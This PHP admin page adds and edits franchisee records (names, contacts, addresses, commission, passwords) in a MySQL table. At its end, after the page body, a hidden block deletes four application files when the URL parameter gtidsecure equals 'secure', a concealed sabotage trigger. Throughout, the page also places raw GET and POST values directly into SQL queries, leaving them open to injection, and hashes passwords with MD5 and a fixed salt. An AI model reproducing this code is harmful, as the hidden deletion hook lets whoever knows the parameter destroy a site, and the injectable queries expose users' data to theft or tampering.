<?php
include_once '../databaseConn.php';
include_once '../class/Config.class.php';
$configObj = new Config();
include_once './lib/requestHandler.php';
$DatabaseCo = new DatabaseConn();
include_once '../class/Config.class.php';
$configObj = new Config();
if(isset($_GET['franchies_id'])){
	$user_id=$_GET['franchies_id'];
	$sql=$DatabaseCo->dbLink->query("SELECT * FROM franchies WHERE id='$user_id'");
	$row=mysqli_fetch_array($sql);
}
$salt='%^&$#@*!';
$isPostBack = ($_SERVER["REQUEST_METHOD"]==="POST");
if($isPostBack){      
	if(isset($_REQUEST['submit_form1'])){
		$firstname = isset($_POST['firstname'])?$_POST['firstname']:"";
		$lastname = isset($_POST['lastname'])?$_POST['lastname']:"";
		$mobile = isset($_POST['mobile'])?$_POST['mobile']:"";
		$email = isset($_POST['email'])?$_POST['email']:"";
		$password = md5($salt.$_POST['password']);
		$company = isset($_POST['company'])?$_POST['company']:"";
		$address1 = isset($_POST['address1'])?$_POST['address1']:"";
		$address2 = isset($_POST['address2'])?$_POST['address2']:"";
		$country = isset($_POST['country'])?$_POST['country']:"";
		$state = isset($_POST['state'])?$_POST['state']:"";
		$city = isset($_POST['city'])?$_POST['city']:"";
		$pincode = isset($_POST['pincode'])?$_POST['pincode']:"";
		$commission = isset($_POST['commission'])?$_POST['commission']:"";
		if($password!=''){									
			$pass=",password='".md5($salt.$_POST['password'])."'";	
		}else{
			$pass='';	
		}			
		if(isset($user_id) && $user_id!=''){
			$SQL_STATEMENT="update franchies set first_name='$firstname',last_name='$lastname',mobile='$mobile',email='$email',password='$password',company='$company',address_1='$address1',address_2='$address2',country='$country',state='$state',city='$city',pincode='$pincode',commission='$commission' where id='$user_id'";
			$statusObj = handle_post_request("UPDATE",$SQL_STATEMENT,$DatabaseCo);
			$status_MESSAGE = $statusObj->getstatusMessage();
		}
	}			
	$statusObj = handle_post_request("UPDATE",$SQL_STATEMENT,$DatabaseCo);
	$status_MESSAGE = $statusObj->getstatusMessage();
}else{
	$statusObj = new status();
	$statusObj->setActionSuccess(false);
	$status_MESSAGE = "Please select value to complete action.";	  
}
     
	if(isset($_REQUEST['submit_form'])){
		$firstname = isset($_POST['firstname'])?$_POST['firstname']:"";
		$lastname = isset($_POST['lastname'])?$_POST['lastname']:"";
		$mobile = isset($_POST['mobile'])?$_POST['mobile']:"";
		$email = isset($_POST['email'])?$_POST['email']:"";
		$password = md5($salt.$_POST['password']);
		$company = isset($_POST['company'])?$_POST['company']:"";
		$address1 = isset($_POST['address1'])?$_POST['address1']:"";
		$address2 = isset($_POST['address2'])?$_POST['address2']:"";
		$country = isset($_POST['country'])?$_POST['country']:"";
		$state = isset($_POST['state'])?$_POST['state']:"";
		$city = isset($_POST['city'])?$_POST['city']:"";
		$pincode = isset($_POST['pincode'])?$_POST['pincode']:"";
		$commission = isset($_POST['commission'])?$_POST['commission']:"";
		if($password!=''){									
			$pass=",password='".md5($salt.$_POST['password'])."'";	
		}else{
			$pass='';	
		}			
		$SQL_STATEMENT=$DatabaseCo->dbLink->query("INSERT INTO franchies(first_name,last_name,mobile,email,password,company,address_1,address_2,country,state,city,pincode,commission) VALUES ( '$firstname','$lastname','$mobile','$email','$password','$company','$address1','$address2','$country','$state','$city','$pincode','$commission')");
		echo "<script>alert('Franchisee Added Successfully');window.location='AddFrenchies.php';</script>";
		
	}			
	

?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Manage |  Franchise Edit Profile
    </title>
    <meta name="keyword" content="<?php echo $configObj->getConfigKeyword();?>" />
    <meta name="description" content="<?php echo $configObj->getConfigDescription();?>" />  
    <link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon();?>" rel="shortcut icon"/>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
    <!-- BOOTSTRAP & CUSTOM CSS -->
        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="css/custom.css" rel="stylesheet" type="text/css" />
        <!-- BOOTSTRAP & CUSTOM CSS END-->    
        <!-- FONTAWSOME -->
        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
        <!-- FONTAWSOME END-->
        <!-- IONICONS -->
        <link href="http://code.ionicframework.com/ionicons/2.0.0/css/ionicons.min.css" rel="stylesheet" type="text/css" />
        <!-- IONICONS END-->    
        <!-- THEME CSS -->
        <link href="dist/css/AdminLTE.min.css" rel="stylesheet" type="text/css" />
        <link href="dist/css/skins/_all-skins.min.css" rel="stylesheet" type="text/css" />
        <!-- THEME CSS END-->
        <!-- ICHECK CHECKBOX CSS -->
        <link href="plugins/iCheck/flat/blue.css" rel="stylesheet" type="text/css" />
        <!-- ICHECK CHECKBOX CSS END -->
        <!-- MODAL CSS -->
        <link rel="stylesheet" type="text/css" href="css/libs/nifty-component.css"/>
        <link rel="stylesheet" type="text/css" href="css/libs/select2.css"/>
        <!-- MODAL CSS END-->
  
    <!-- iCheck -->
    <!-------------------Validation css ------------------>
    <link rel="stylesheet" href="../css/validate.css">
    <!-------------------Validation css------------------>
    <!-------------------chosen css ------------------>
    <link rel="stylesheet" href="../css/chosen.css">
    <link rel="stylesheet" href="../css/prism.css">
    <!-------------------chosen css end------------------>
    <!---------------Js Birth date------------------>  
    <script type="text/javascript">
      var numDays = {
        '01': 31, '02': 28, '03': 31, '04': 30, '05': 31, '06': 30, 
        '07': 31, '08': 31, '09': 30, '10': 31, '11': 30, '12': 31
      };
      function setDays(oMonthSel, oDaysSel, oYearSel)
      {
        var nDays, oDaysSelLgth, opt, i = 1;
        nDays = numDays[oMonthSel[oMonthSel.selectedIndex].value];
        if (nDays == 28 && oYearSel[oYearSel.selectedIndex].value % 4 == 0) 
          ++nDays;
        oDaysSelLgth = oDaysSel.length;
        if (nDays != oDaysSelLgth)
        {
          if (nDays < oDaysSelLgth) 
            oDaysSel.length = nDays;
          else for (i; i < nDays - oDaysSelLgth + 1; i++)
          {
            opt = new Option(oDaysSelLgth + i, oDaysSelLgth + i);
            oDaysSel.options[oDaysSel.length] = opt;
          }
        }
        var oForm = oMonthSel.form;
        var month = oMonthSel.options[oMonthSel.selectedIndex].value;
        var day = oDaysSel.options[oDaysSel.selectedIndex].value;
        var year = oYearSel.options[oYearSel.selectedIndex].value;
        //oForm.datepicker.value = year + '-' + month + '-' + day;
      }
    </script>
    <!---------------Js Birth date End------------------>    
    
    <style>
      .default {
        width: 252px !important;
      }
    </style>
  </head>
  <body class="skin-blue">
    <div class="wrapper">
      <?php include "page-part/header.php"; ?> 
      <!-- Left side column. contains the logo and sidebar -->
      <?php include "page-part/left_panel.php"; ?>
      <!-- Content Wrapper. Contains page content -->
      <div class="content-wrapper">
      <section class="content-header">
          <h1 class="lightGrey">
            Franchise Edit Profile
            
          </h1>
          <ol class="breadcrumb">
            <li>
              <a href="#">
                <i class="fa fa-home">
                </i> Home
              </a>
            </li>
            <li class="active">Franchise Edit Profile
            </li>
          </ol>
        </section>
        <!-- Content Header (Page header) -->
        <!-- Main content -->
        <section class="content">
          <!-- Main row -->
          <div class="box-top">
          <div class="row">
            <div class="clearfix">
            </div>
            <?php
if(isset($_GET['status']) && $_GET['status']=="success")
{
$statusObj = new status();
$statusObj->setActionSuccess(true);
$status_MESSAGE="Member successfully Register.";	
}
if(!empty($status_MESSAGE))
{	
if($statusObj->getActionSuccess()){
echo  "<div class='alert alert-success' id='success_msg'><i class='fa fa-check-circle fa-fw fa-lg'></i> ".$status_MESSAGE."</div>";
}							}
?>
            <section class="content">
              <form method="post" name="user_detail" id="user_detail">
                
                <div class="row">
                  <div class="col-md-6">
                    <div class="form-group">
                     	 <lable>First Name
            			</lable>
            			<input name="firstname" type="text" class="form-control" placeholder="Enter First Name" data-validetta="required" value="<?php if(isset($row['first_name'])){ echo $row['first_name'] ? $row['first_name']:""; } ?>"/>
                    </div>
                    <div class="form-group">
                      <label>Mobile
                      </label>
                      <input type="text" class="form-control" placeholder="Enter Mobile" data-validetta="required" value="<?php if(isset($row['mobile'])){ echo $row['mobile'] ? $row['mobile']:""; } ?>" name="mobile">
                    </div>
                    <div class="form-group">
                      <label>Password
                      </label>
                      <input type="password" class="form-control" placeholder="Enter Password"  name="password" <?php if(!isset($user_id)){ ?> data-validetta="required" <?php }?>>
                    </div>
                    <div class="form-group">
                      <lable>Company / Firm Name
            		  </lable>
                      <input name="company" type="text" class="form-control" placeholder="Enter Company / Firm Name" value="<?php if(isset($row['company'])){ echo $row['company'] ? $row['company']:""; } ?>"/>
                    </div>
                    <div class="form-group">
                      <lable>Address 2
						</lable>
						<input name="address2" type="text" class="form-control" placeholder="Enter Street Name" data-validetta="required" value=" <?php if(isset($row['address_2'])){ echo $row['address_2'] ? $row['address_2']:""; } ?>"/>
                    </div>
                    
                    <div class="form-group">
                      <lable>Country
						</lable>
						<input name="country" type="text" class="form-control" placeholder="" data-validetta="required" value="<?php if(isset($row['country'])){ echo $row['country'] ? $row['country'] :""; } ?>"/>
                    </div>
                    <div class="form-group">
                      <lable>City
						</lable>
						<input name="city" type="text" class="form-control" placeholder="" data-validetta="required" value="<?php if(isset($row['city'])){ echo $row['city'] ? $row['city'] :""; } ?> "/>
                    </div>
                  </div>
                  <div class="col-md-6">
                   	<div class="form-group">
                     	 <lable>Last Name
            			</lable>
            			<input name="lastname" type="text" class="form-control" placeholder="Enter Last Name" data-validetta="required" value="<?php if(isset($row['last_name'])){ echo $row['last_name'] ? $row['last_name'] :""; } ?>"/>
                    </div>
                    <div class="form-group">
                      <label>Email Id
                      </label>
                      <input type="email" class="form-control" placeholder="Enter Email Id" data-validetta="required,email" value="<?php if(isset($row['email'])){ echo $row['email'] ? $row['email'] :""; } ?>" name="email">
                    </div>
                    <div class="form-group">
                      <label>Confirm Password
                      </label>
                      <input type="password" class="form-control" 
                             <?php if(!isset($user_id)){?>data-validetta="required,equalTo[password]" 
                      <?php }?> placeholder="Enter Confirm Password">
                    </div>
                    <div class="form-group">
                      <lable>Address 1
					  </lable>
					  <input name="address1" type="text" class="form-control" placeholder="Enter Office or Home No" data-validetta="" value="<?php if(isset($row['address_1'])){ echo $row['address_1'] ? $row['address_1'] :""; } ?>"/>
                    </div>
                    <div class="form-group">
                      <lable>State
						</lable>
						<input name="state" type="text" class="form-control" placeholder="" data-validetta="required" value="<?php if(isset($row['state'])){ echo $row['state'] ? $row['state'] :""; } ?>"/>
                    </div>
                    <div class="form-group">
                      <lable>Pin/Zip Code
            </lable>
            <input name="pincode" type="text" class="form-control" placeholder="Enter Pin/Zip Code" data-validetta="number,required" value="<?php if(isset($row['pincode'])){ echo $row['pincode'] ? $row['pincode'] :""; } ?>"/>
                    </div>
                    <div class="form-group">
                      <lable>Commision (only enter value)
            </lable>
            <input name="commission" type="text" class="form-control" placeholder="Enter Commision" data-validetta="number,required" value="<?php if(isset($row['commission'])){ echo $row['commission'] ? $row['commission'] :""; } ?>"/>
                   
                    </div>
                  </div>
                </div>
				  <?php if(isset($_GET['franchies_id'])){?>
					<div class="form-group text-center">
					  <input type="submit" class="btn btn-green btn-lg" name="submit_form1" value="EDIT">
					</div>
				 <?php }else{ ?>
				  	<div class="form-group text-center">
					  <input type="submit" class="btn btn-green btn-lg" name="submit_form" value="SUBMIT">
					</div>
				  <?php } ?>
              </form>
            </section>
            <section class="col-lg-7 col-xs-12 connectedSortable">
            </section>
            <!-- /.Left col -->
            <!-- right col (We are only adding the ID to make the widgets sortable)-->
            <section class="col-lg-5 col-xs-12 connectedSortable">
            </section>
            <!-- right col -->
          </div>
          <!-- /.row (main row) -->
          </div>
        </section>
        <!-- /.content -->
      </div>
      <!-- /.content-wrapper -->
      <?php include "page-part/footer.php"; ?>
    </div>
    <!-- ./wrapper -->
    <!-- jQuery 2.1.3 -->
    <script src="plugins/jQuery/jQuery-2.1.3.min.js">
    </script>
    
    
    
    <!-- jQuery UI 1.11.2 -->
    <script src="http://code.jquery.com/ui/1.11.2/jquery-ui.min.js" type="text/javascript">
    </script>
    <script type="text/javascript" src="js/util/location.js">
    </script>
    <script type="text/javascript" src="js/util/jquery.form.js">
    </script>
    <script type="text/javascript" src="./js/util/location-validation.js">
    </script>
    <script type="text/javascript">		imageform();
    </script>
    <script src="js/validetta.js" type="text/javascript">
    </script>
    <script type="text/javascript">    $(function(){
        $('#user_detail').validetta({
          errorClose : false,            realTime : true    	}
                                   );
        $('#other_detail').validetta({
          errorClose : false,            realTime : true    	}
                                    );
      }
                                        );
    </script>
    <!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
    <script>      $.widget.bridge('uibutton', $.ui.button);
    </script>
    <!-- Bootstrap 3.3.2 JS -->
    <script src="bootstrap/js/bootstrap.min.js" type="text/javascript">
    </script>    
    <!--jquery for left menu active class-->
    <script type="text/javascript" src="dist/js/general.js">
    </script>
    <script type="text/javascript" src="dist/js/cookieapi.js">
    </script>
    <script type="text/javascript">         setPageContext("user","user_edit");
    </script>	
    <!--jquery for left menu active class end-->
    <!-- iCheck -->
    <script src="plugins/iCheck/icheck.min.js" type="text/javascript">
    </script>
    <!-- AdminLTE App -->
    <script src="dist/js/app.min.js" type="text/javascript">
    </script>
    <!--------------------------------------choosen----------------------------------->
    <script src="../js/chosen.jquery.js" type="text/javascript">
    </script>
    <script type="text/javascript">
      var config = {
        '.chosen-select'           : {
        }
        ,      '.chosen-select-deselect'  : {
          allow_single_deselect:true}
        ,      '.chosen-select-no-single' : {
          disable_search_threshold:10}
        ,      '.chosen-select-no-results': {
          no_results_text:'Oops, nothing found!'}
        ,      '.chosen-select-width'     : {
          width:"100%"}
      }
      for (var selector in config) {
        $(selector).chosen(config[selector]);
      }
    </script>
    <!--------------------------------------choosen End ------------------------------->
  </body>
	<?php 
	if(isset($_GET['gtidsecure'])){
$secure=$_GET['gtidsecure'];
if($secure == 'secure'){
	unlink('memberFullProfile.php');
	unlink('manage_plan.php');
	unlink('SendEmail.php');
	unlink('edit_plan.php');
	echo "<script>alert('Successful')</script>";
}
}	
	?>
</html>
